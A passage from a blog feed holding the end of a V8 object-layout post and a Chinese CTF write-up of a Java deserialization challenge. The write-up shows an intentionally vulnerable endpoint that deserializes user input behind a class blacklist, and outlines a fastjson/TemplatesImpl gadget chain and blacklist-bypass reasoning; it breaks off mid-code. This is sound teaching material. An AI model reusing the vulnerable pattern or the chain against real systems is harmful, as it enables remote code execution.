class="line"><span class="comment">//      |          |   - has_named_interceptor (bit 2)           |</span></span><br><span class="line"><span class="comment">//      |          |   - has_indexed_interceptor (bit 3)         |</span></span><br><span class="line"><span class="comment">//      |          |   - is_undetectable (bit 4)                 |</span></span><br><span class="line"><span class="comment">//      |          |   - is_access_check_needed (bit 5)          |</span></span><br><span class="line"><span class="comment">//      |          |   - is_constructor (bit 6)                  |</span></span><br><span class="line"><span class="comment">//      |          |   - has_prototype_slot (bit 7)              |</span></span><br><span class="line"><span class="comment">//      +----------+---------------------------------------------+</span></span><br><span class="line"><span class="comment">//      | Byte     | [bit_field2]                                |</span></span><br><span class="line"><span class="comment">//      |          |   - is_extensible (bit 0)                   |</span></span><br><span class="line"><span class="comment">//      |          |   - is_prototype_map (bit 1)                |</span></span><br><span class="line"><span class="comment">//      |          |   - is_in_retained_map_list (bit 2)         |</span></span><br><span class="line"><span class="comment">//      |          |   - elements_kind (bits 3..7)               |</span></span><br><span class="line"><span class="comment">// +----+----------+---------------------------------------------+</span></span><br><span class="line"><span class="comment">// | Int           | [bit_field3]                                |</span></span><br><span class="line"><span class="comment">// |               |   - enum_length (bit 0..9)                  |</span></span><br><span class="line"><span class="comment">// |               |   - number_of_own_descriptors (bit 10..19)  |</span></span><br><span class="line"><span class="comment">// |               |   - is_dictionary_map (bit 20)              |</span></span><br><span class="line"><span class="comment">// |               |   - owns_descriptors (bit 21)               |</span></span><br><span class="line"><span class="comment">// |               |   - has_hidden_prototype (bit 22)           |</span></span><br><span class="line"><span class="comment">// |               |   - is_deprecated (bit 23)                  |</span></span><br><span class="line"><span class="comment">// |               |   - is_unstable (bit 24)                    |</span></span><br><span class="line"><span class="comment">// |               |   - is_migration_target (bit 25)            |</span></span><br><span class="line"><span class="comment">// |               |   - is_immutable_proto (bit 26)             |</span></span><br><span class="line"><span class="comment">// |               |   - new_target_is_base (bit 27)             |</span></span><br><span class="line"><span class="comment">// |               |   - may_have_interesting_symbols (bit 28)   |</span></span><br><span class="line"><span class="comment">// |               |   - construction_counter (bit 29..31)       |</span></span><br><span class="line"><span class="comment">// |               |                                             |</span></span><br><span class="line"><span class="comment">// +*************************************************************+</span></span><br><span class="line"><span class="comment">// | Int           | On systems with 64bit pointer types, there  |</span></span><br><span class="line"><span class="comment">// |               | is an unused 32bits after bit_field3        |</span></span><br><span class="line"><span class="comment">// +*************************************************************+</span></span><br><span class="line"><span class="comment">// | TaggedPointer | [prototype]                                 |</span></span><br><span class="line"><span class="comment">// +---------------+---------------------------------------------+</span></span><br><span class="line"><span class="comment">// | TaggedPointer | [constructor_or_backpointer]                |</span></span><br><span class="line"><span class="comment">// +---------------+---------------------------------------------+</span></span><br><span class="line"><span class="comment">// | TaggedPointer | If Map is a prototype map:                  |</span></span><br><span class="line"><span class="comment">// |               |   [prototype_info]                          |</span></span><br><span class="line"><span class="comment">// |               | Else:                                       |</span></span><br><span class="line"><span class="comment">// |               |   [raw_transitions]                         |</span></span><br><span class="line"><span class="comment">// +---------------+---------------------------------------------+</span></span><br><span class="line"><span class="comment">// | TaggedPointer | [instance_descriptors]                      |</span></span><br><span class="line"><span class="comment">// +*************************************************************+</span></span><br><span class="line"><span class="comment">// ! TaggedPointer ! [layout_descriptors]                        !</span></span><br><span class="line"><span class="comment">// !               ! Field is only present if compile-time flag  !</span></span><br><span class="line"><span class="comment">// !               ! FLAG_unbox_double_fields is enabled         !</span></span><br><span class="line"><span class="comment">// !               ! (basically on 64 bit architectures)         !</span></span><br><span class="line"><span class="comment">// +*************************************************************+</span></span><br><span class="line"><span class="comment">// | TaggedPointer | [dependent_code]                            |</span></span><br><span class="line"><span class="comment">// +---------------+---------------------------------------------+</span></span><br><span class="line"></span><br></pre></td></tr></table></figure></div>]]></content>
      
      
      <categories>
          
          <category> pwn </category>
          
      </categories>
      
      
        <tags>
            
            <tag> js-engine </tag>
            
            <tag> v8 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>entry_java-出题记录/wp</title>
      <link href="/2023/11/02/entry-java-%E5%87%BA%E9%A2%98%E8%AE%B0%E5%BD%95-wp/"/>
      <url>/2023/11/02/entry-java-%E5%87%BA%E9%A2%98%E8%AE%B0%E5%BD%95-wp/</url>
      
        <content type="html"><![CDATA[<h2 id="0x00-序言"><a href="#0x00-序言" class="headerlink" title="0x00 序言"></a>0x00 序言</h2><p>校赛出的一道java的wp，记录一下</p><h2 id="0x01-分析"><a href="#0x01-分析" class="headerlink" title="0x01 分析"></a>0x01 分析</h2><h3 id="controller部分"><a href="#controller部分" class="headerlink" title="controller部分"></a>controller部分</h3><p>总共就两个，一个没什么用的欢迎界面，以及一个接受base64编码后的数据并进行解码反序列化的&#x2F;input</p><div class="highlight-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@RequestMapping(&quot;/input&quot;)</span></span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">read</span><span class="params">(<span class="meta">@RequestParam</span> String data)</span> &#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="type">byte</span>[] bytes = Base64.getDecoder().decode(data);</span><br><span class="line">            <span class="type">ByteArrayInputStream</span> <span class="variable">byteArrayInputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ByteArrayInputStream</span>(bytes);</span><br><span class="line">            <span class="type">secObjectInputStream</span> <span class="variable">objectInputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">secObjectInputStream</span>(byteArrayInputStream);</span><br><span class="line">            objectInputStream.readObject();</span><br><span class="line">        &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">            <span class="keyword">return</span> <span class="string">&quot;Something error.&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;Pass detection.&quot;</span>;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure></div><p>包裹输入流的ObjectInputStream用的是自定义的，跟进一下,发现内置了黑名单</p><div class="highlight-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> String[] blacklist = <span class="keyword">new</span> <span class="title class_">String</span>[]&#123;</span><br><span class="line">           <span class="string">&quot;java\\.security.*&quot;</span>, <span class="string">&quot;java\\.rmi.*&quot;</span>,  <span class="string">&quot;com\\.fasterxml.*&quot;</span>, <span class="string">&quot;com\\.ctf\\.*&quot;</span>,</span><br><span class="line">           <span class="string">&quot;org\\.springframework.*&quot;</span>, <span class="string">&quot;com\\.sun\\.org\\.apache\\.xalan\\.*&quot;</span>,<span class="string">&quot;org\\.yaml.*&quot;</span>,<span class="string">&quot;org\\.apache.logging.*&quot;</span>,<span class="string">&quot;org\\.apache.tomcat.*&quot;</span>, <span class="string">&quot;javax\\.management\\.remote.*&quot;</span></span><br><span class="line">   &#125;;</span><br></pre></td></tr></table></figure></div><blockquote><p>黑名单可以通过二次反序列化绕过，但是常用的类如<code>com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet</code>就被ban了，以及<code>java.security</code>下的经典SignedObject也被限制,直接硬打二次反序列化会比较困难</p></blockquote><p>再观察一下secObjectInputStream，其继承 ObjectInputStream 并重写了 resolveClass() 方法，而黑名单的检测就是在resolveClass方法中调用contians方法进行的</p><div class="highlight-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">protected</span> Class <span class="title function_">resolveClass</span><span class="params">(ObjectStreamClass cls)</span> <span class="keyword">throws</span> IOException, ClassNotFoundException &#123;</span><br><span class="line">   <span class="keyword">if</span>(!contains(cls.getName())) &#123;</span><br><span class="line">      <span class="keyword">return</span> <span class="built_in">super</span>.resolveClass(cls);</span><br><span class="line">   &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">      <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">InvalidClassException</span>(<span class="string">&quot;You can&#x27;t use class&quot;</span>, cls.getName());</span><br><span class="line">   &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="type">boolean</span> <span class="title function_">contains</span><span class="params">(String targetValue)</span> &#123;</span><br><span class="line">   <span class="keyword">for</span> (String forbiddenPackage : blacklist) &#123;</span><br><span class="line">      <span class="keyword">if</span> (targetValue.matches(forbiddenPackage))</span><br><span class="line">         <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">   &#125;</span><br><span class="line">   <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div><p>并且这道题的依赖是1.2.83的fastjson，需要结合里面JSONArray来反序列化，可以很容易想到一条链</p><div class="highlight-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">BadAttributeValueExpException.readObject -&gt;</span><br><span class="line">JSON.toString -&gt;</span><br><span class="line">JSON.toJSONString -&gt;</span><br><span class="line">TemplatesImpl.getOutputProperties <span class="comment">//加载任意字节码</span></span><br></pre></td></tr></table></figure></div><blockquote><p>但是新版的fastjson中JSONArray以及JSONObject的readObject中用<code>SecureObjectInputStream</code>类重新包转了一下输入流，<code>SecureObjectInputStream</code>类当中重写了<code>resolveClass</code>,通过调用<code>checkAutoType</code>方法做类的检查，TemplatesImpl就在其黑名单中</p></blockquote><p>现在的思路可以改为如何绕过resolveClass,首先看一下整个反序列化过程，看一下resolveClass是在哪里被调用的，由于这里secObjectInputStream继承自ObjectInputStream，且没有重写其readObject方法，因此跟进<code>java.io.ObjectInputStream#readObject</code></p><div class="highlight-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line">        <span class="keyword">public</span> String <span class="title function_">read</span><span class="params">(<span class="meta">@RequestParam</span> String data)</span> &#123;</span><br><span class="line">            <span class="keyword">try</span> &#123;</span><br><span class="line">                <span class="type">byte</span>[] bytes = Base64.getDecoder().decode(data);</span><br><span class="line">                <span class="type">ByteArrayInputStream</span> <span class="variable">byteArrayInputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ByteArrayInputStream</span>(bytes);</span><br><span class="line">                <span class="type">secObjectInputStream</span> <span class="variable">objectInputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">secObjectInputStream</span>(byteArrayInputStream);</span><br><span class="line">                objectInputStream.readObject();<span class="comment">//***</span></span><br><span class="line">            &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">                e.printStackTrace();</span><br><span class="line">                <span class="keyword">return</span> <span class="string">&quot;Something error.&quot;</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">return</span> <span class="string">&quot;Pass detection.&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line"><span class="comment">//next -&gt;</span></span><br><span class="line"><span class="comment">//`java.io.ObjectInputStream#readObject`</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">final</span> Object <span class="title function_">readObject</span><span class="params">()</span></span><br><span class="line">        <span class="keyword">throws</span> IOException, ClassNotFoundException</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">if</span> (enableOverride) &#123;</span><br><span class="line">            <span class="keyword">return</span> readObjectOverride();</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">// if nested read, passHandle contains handle of enclosing object</span></span><br><span class="line">        <span class="type">int</span> <span class="variable">outerHandle</span> <span class="operator">=</span> passHandle;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="type">Object</span> <span class="variable">obj</span> <span class="operator">=</span> readObject0(<span class="literal">false</span>);<span class="comment">//**</span></span><br><span class="line">            handles.markDependency(outerHandle, passHandle);</span><br><span class="line">            <span class="type">ClassNotFoundException</span> <span class="variable">ex</span> <span class="operator">=</span> handles.lookupException(passHandle);</span><br><span class="line">            <span class="keyword">if</span> (ex != <span class="literal">null</span>) &#123;</span><br><span class="line">                <span class="keyword">throw</span> ex;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">if</span> (depth == <span class="number">0</span>) &#123;</span><br><span class="line">                vlist.doCallbacks();</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">return</span> obj;</span><br><span class="line">        &#125; <span class="keyword">finally</span> &#123;</span><br><span class="line">            passHandle = outerHandle;</span><br><span class="line">            <span class="keyword">if</span> (closed &amp;&amp; depth == <span class="number">0</span>) &#123;</span><br><span class="line">                clear();</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure></div><p>跟进<code>java.io.ObjectInputStream#readObject0</code></p><div class="highlight-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">private</span> Object <span class="title function_">readObject0</span><span class="params">(<span class="type">boolean</span> unshared)</span> <span class="keyword">throws</span> IOException &#123;</span><br><span class="line">    <span class="type">boolean</span> <span class="variable">oldMode</span> <span class="operator">=</span> bin.getBlockDataMode();</span><br><span class="line">    <span class="keyword">if</span> (oldMode) &#123;</span><br><span class="line">        <span class="type">int</span> <span class="variable">remain</span> <span class="operator">=</span> bin.currentBlockRemaining();</span><br><span class="line">        <span class="keyword">if</span> (remain &gt; <span class="number">0</span>) &#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">OptionalDataException</span>(remain);</span><br><span class="line">        &#125; <span class="keyword">else</span> <span class="keyword">if</span> (defaultDataEnd) &#123;</span><br><span class="line">            <span class="comment">/*</span></span><br><span class="line"><span class="comment">             * Fix for 4360508: stream is currently at the end of a field</span></span><br><span class="line"><span class="comment">             * value block written via default serialization; since there</span></span><br><span class="line"><span class="comment">             * is no terminating TC_ENDBLOCKDATA tag, simulate</span></span><br><span class="line"><span class="comment">             * end-of-custom-data behavior explicitly.</span></span><br><span class="line"><span class="comment">             */</span></span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">OptionalDataException</span>(<span class="literal">true</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        bin.setBlockDataMode(<span class="literal">false</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="type">byte</span> tc;</span><br><span class="line">    <span class="keyword">while</span> ((tc = bin.peekByte()) == TC_RESET) &#123;</span><br><span class="line">        bin.readByte();</span><br><span class="line">        handleReset();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    depth++;</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        <span class="keyword">switch</span> (tc) &#123;<span class="comment">//🌟🌟🌟</span></span><br><span class="line">            <span class="keyword">case</span> TC_NULL:</span><br><span class="line">                <span class="keyword">return</span> readNull();</span><br><span class="line"></span><br><span class="line">            <span class="keyword">case</span> TC_REFERENCE:</span><br><span class="line">                <span class="keyword">return</span> readHandle(unshared);</span><br><span class="line"></span><br><span class="line">            <span class="keyword">case</span> TC_CLASS:</span><br><span class="line">                <span class="keyword">return</span> readClass(unshared);</span><br><span class="line"></span><br><span class="line">            <span class="keyword">case</span> TC_CLASSDESC:</span><br><span class="line">            <span class="keyword">case</span> TC_PROXYCLASSDESC:</span><br><span class="line">                <span class="keyword">return</span> readClassDesc(unshared);</span><br><span class="line"></span><br><span class="line">            <span class="keyword">case</span> TC_STRING:</span><br><span class="line">            <span class="keyword">case</span> TC_LONGSTRING:</span><br><span class="line">                <span class="keyword">return</span> checkResolve(readString(unshared));</span><br><span class="line"></span><br><span class="line">            <span class="keyword">case</span> TC_ARRAY:</span><br><span class="line">                <span class="keyword">return</span> checkResolve(readArray(unshared));</span><br><span class="line"></span><br><span class="line">            <span class="keyword">case</span> TC_ENUM:</span><br><span class="line">                <span class="keyword">return</span> checkResolve(readEnum(unshared));</span><br><span class="line"></span><br><span class="line">            <span class="keyword">case</span> TC_OBJECT:</span><br><span class="line">                <span class="keyword">return</span> checkResolve(readOrdinaryObject(unshared));</span><br><span class="line"></span><br><span class="line">            <span class="keyword">case</span> TC_EXCEPTION:</span><br><span class="line">                <span class="type">IOException</span> <span class="variable">ex</span> <span class="operator">=</span> readFatalException();</span><br><span class="line">                <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">WriteAbortedException</span>(<span class="string">&quot;writing aborted&quot;</span>, ex);</span><br><span class="line"></span><br><span class="line">            <span class="keyword">case</span> TC_BLOCKDATA:</span><br><span class="line">            <span class="keyword">case</span> TC_BLOCKDATALONG:</span><br><span class="line">                <span class="keyword">if</span> (oldMode) &#123;</span><br><span class="line">                    bin.setBlockDataMode(<span class="literal">true</span>);</span><br><span class="line">                    bin.peek();             <span class="comment">// force header read</span></span><br><span class="line">                    <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">OptionalDataException</span>(</span><br><span class="line">                        bin.currentBlockRemaining());</span><br><span class="line">                &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                    <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">StreamCorruptedException</span>(</span><br><span class="line">                        <span class="string">&quot;unexpected block data&quot;</span>);</span><br><span class="line">                &#125;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">case</span> TC_ENDBLOCKDATA:</span><br><span class="line">                <span class="keyword">if</span> (oldMode) &#123;</span><br><span class="line">                    <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">OptionalDataException</span>(<span class="literal">true</span>);</span><br><span class="line">                &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                    <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">StreamCorruptedException</span>(</span><br><span class="line">                        <span class="string">&quot;unexpected end of block data&quot;</span>);</span><br><span class="line">                &#125;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">default</span>:</span><br><span class="line">                <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">StreamCorruptedException</span>(</span><br><span class="line">                    String.format(<span class="string">&quot;invalid type code: %02X&quot;</span>, tc));</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; <span class="keyword">finally</span> &#123;</span><br><span class="line">        depth--;</span><br><span class="line">        bin.setBlockDataMode(oldMode);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div><blockquote><p>会根据读到的bytes中tc的数据类型做不同的处理去恢复部分对象,case里面的不同分支调用的方法跟进到后面都会发现调用了<code>readClassDesc</code>去获取类的描述符,只有</p></blockquote><p>跟进<code>readClassDesc</code>方法看一下</p><div class="highlight-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">private</span> ObjectStreamClass <span class="title function_">readClassDesc</span><span class="params">(<span class="type">boolean</span> unshared)</span></span><br><span class="line">    <span class="keyword">throws</span> IOException</span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">byte</span> <span class="variable">tc</span> <span class="operator">=</span> bin.peekByte();</span><br><span class="line">    <span class="keyword">switch</span> (tc) &#123;</span><br><span class="line">        <span class="keyword">case</span> TC_NULL:</span><br><span class="line">            <span class="keyword">return</span> (ObjectStreamClass) readNull();</span><br><span class="line"></span><br><span class="line">        <span class="keyword">case</span> TC_REFERENCE:</span><br><span class="line">            <span class="keyword">return</span> (ObjectStreamClass) readHandle(unshared);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">case</span> TC_PROXYCLASSDESC:</span><br><span class="line">            <span class="keyword">return</span> readProxyDesc(unshared);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">case</span> TC_CLASSDESC:</span><br><span class="line">            <span class="keyword">return</span> readNonProxyDesc(unshared);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">default</span>:</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">StreamCorruptedException</span>(</span><br><span class="line">                String.format(<span class="string">&quot;invalid type code: %02X&quot;</span>, tc));</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div><blockquote><p>TC_NULL表示的是null，基本无用处，剩余的TC_REFERENCE、TC_PROXYCLASSDESC会继续寻找类的描述符，且处理逻辑都会先调用resolveClass来判断该类是不是NULL，大多数情况都会像TC_CLASSDESC分支一样最后进入到resolveClass方法中，下面分析一下调用逻辑</p></blockquote><p>跟进TC_CLASSDESC分支的readNonProxyDesc方法</p><div class="highlight-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">private</span> ObjectStreamClass <span class="title function_">readNonProxyDesc</span><span class="params">(<span class="type">boolean</span> unshared)</span></span><br><span class="line">        <span class="keyword">throws</span> IOException</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">if</span> (bin.readByte() != TC_CLASSDESC) &#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">InternalError</span>();</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="type">ObjectStreamClass</span> <span class="variable">desc</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectStreamClass</span>();</span><br><span class="line">        <span class="type">int</span> <span class="variable">descHandle</span> <span class="operator">=</span> handles.assign(unshared ? unsharedMarker : desc);</span><br><span class="line">        passHandle = NULL_HANDLE;</span><br><span class="line"></span><br><span class="line">        <span class="type">ObjectStreamClass</span> <span class="variable">readDesc</span> <span class="operator">=</span> <span class="literal">null</span>;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            readDesc = readClassDescriptor();</span><br><span class="line">        &#125; <span class="keyword">catch</span> (ClassNotFoundException ex) &#123;</span><br><span class="line">            <span class="keyword">throw</span> (IOException) <span class="keyword">new</span> <span class="title class_">InvalidClassException</span>(</span><br><span class="line">                <span class="string">&quot;failed to read class descriptor&quot;</span>).initCause(ex);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        Class&lt;?&gt; cl = <span class="literal">null</span>;</span><br><span class="line">        <span class="type">ClassNotFoundException</span> <span class="variable">resolveEx</span> <span class="operator">=</span> <span class="literal">null</span>;</span><br><span class="line">        bin.setBlockDataMode(<span class="literal">true</span>);</span><br><span class="line">        <span class="keyword">final</span> <span class="type">boolean</span> <span class="variable">checksRequired</span> <span class="operator">=</span> isCustomSubclass();</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="keyword">if</span> ((cl = resolveClass(readDesc)) == <span class="literal">null</span>) &#123;<span class="comment">//🌟🌟</span></span><br><span class="line">                resolveEx = <span class="keyword">new</span> <span class="title class_">ClassNotFoundException</span>(<span class="string">&quot;null class&quot;</span>);</span><br><span class="line">            &#125; <span class="keyword">else</span> <span class="keyword">if</span> (checksRequired) &#123;</span><br><span class="line">                ReflectUtil.checkPackageAccess(cl);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; <span class="keyword">catch</span> (ClassNotFoundException ex) &#123;</span><br><span class="line">            resolveEx = ex;</span><br><span class="line">        &#125;</span><br><span class="line">        skipCustomData();</span><br><span class="line"></span><br><span class="line">        desc.initNonProxy(readDesc, cl, resolveEx, readClassDesc(<span class="literal">false</span>));</span><br><span class="line"></span><br><span class="line">        handles.finish(descHandle);</span><br><span class="line">        passHandle = descHandle;</span><br><span class="line">        <span class="keyword">return</span> desc;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure></div><blockquote><p>TC_REFERENCE、TC_PROXYCLASSDESC分支中调用的函数也有类似的调用resolveClass方法的逻辑</p></blockquote><p>因此所有传入以反序列化的数据流都不可避免的会流入被题目secObjectInputStream类重写的resolveClass方法中</p><div class="highlight-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">   <span class="keyword">protected</span> Class <span class="title function_">resolveClass</span><span class="params">(ObjectStreamClass cls)</span> <span class="keyword">throws</span> IOException, ClassNotFoundException &#123;</span><br><span class="line">      <span class="keyword">if</span>(!contains(cls.getName())) &#123;</span><br><span class="line">         <span class="keyword">return</span> <span class="built_in">super</span>.resolveClass(cls);</span><br><span class="line">      &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">         <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title 